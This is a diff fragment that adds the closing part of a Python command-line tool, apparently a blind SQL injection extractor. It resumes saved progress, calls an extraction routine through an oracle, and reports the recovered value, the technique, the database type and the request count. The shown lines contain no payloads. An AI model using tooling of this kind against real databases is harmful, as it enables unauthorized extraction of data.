@@ -1235,4 +1235,24 @@ def main():
         st = load_state(state_path, sig)
         if st:
             length, value = st.get("length"), st.get("value", "")
-  
+            print(f"[*] resuming: {len(value)}/{length} -> '{value}'")
+    val = extract_search(det.oracle, a, state_path, sig, value, length)
+    if val is None:
+        print("[!] length not found (empty result or bad query)")
+        sys.exit(1)
+    print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
+    try:
+        os.remove(state_path)
+    except OSError:
+        pass
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except RequestError as e:
+        print(f"\n[!] {e}", file=sys.stderr)
+        sys.exit(2)
+    except KeyboardInterrupt:
+        print("\n[!] interrupted", file=sys.stderr)
+        sys.exit(130)
